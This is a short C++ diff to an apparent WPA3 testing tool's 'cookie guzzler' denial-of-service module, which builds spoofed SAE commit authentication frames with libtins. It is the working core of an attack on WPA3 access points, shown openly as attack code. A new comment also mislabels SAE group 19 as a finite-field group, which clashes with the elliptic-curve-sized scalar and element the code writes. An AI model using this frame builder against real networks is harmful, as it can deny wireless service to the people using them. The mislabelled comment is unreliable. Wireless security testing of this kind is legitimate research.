@@ -1,7 +1,6 @@
 #include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
 
 #include <tins/tins.h>
-#include <iostream>
 #include <string>
 #include <random>
 
@@ -15,7 +14,7 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::cookie_guzzler{
-    RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, SAEPair sae_params){
+    RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const SAEPair &sae_params){
 
         // Build the 802.11 Auth frame
         Dot11Authentication auth;
@@ -25,13 +24,24 @@ namespace wpa3_tester::cookie_guzzler{
         auth.type(Dot11::MANAGEMENT);
         auth.subtype(Dot11::AUTH);
 
-        auth.auth_algorithm(3);  // algo=3  (Shared-key / custom)
+        auth.auth_algorithm(3);  // algo=3  (SAE)
         auth.auth_seq_number(1); // commit
         auth.status_code(0);
 
+        // Build SAE commit frame with proper FFC format
         vector<uint8_t> current_payload;
-        current_payload.insert(current_payload.end(), sae_params.scalar.begin(), sae_params.scalar.end());
-        current_payload.insert(current_payload.end(), sae_params.element.begin(), sae_params.element.end());
+
+        current_payload.push_back(0x13);
+        current_payload.push_back(0x00);  // Group: 19 (finite field cyclic group)
+        
+        for (size_t i = 0; i < 32 && i < sae_params.scalar.size(); ++i) {
+            current_payload.push_back(sae_params.scalar[i]);
+        }
+
+        for (size_t i = 0; i < 64 && i < sae_params.element.size(); ++i) {
+            current_payload.push_back(sae_params.element[i]);
+        }
+
         const RawPDU raw_data(current_payload);
         auth.inner_pdu(raw_data);
 
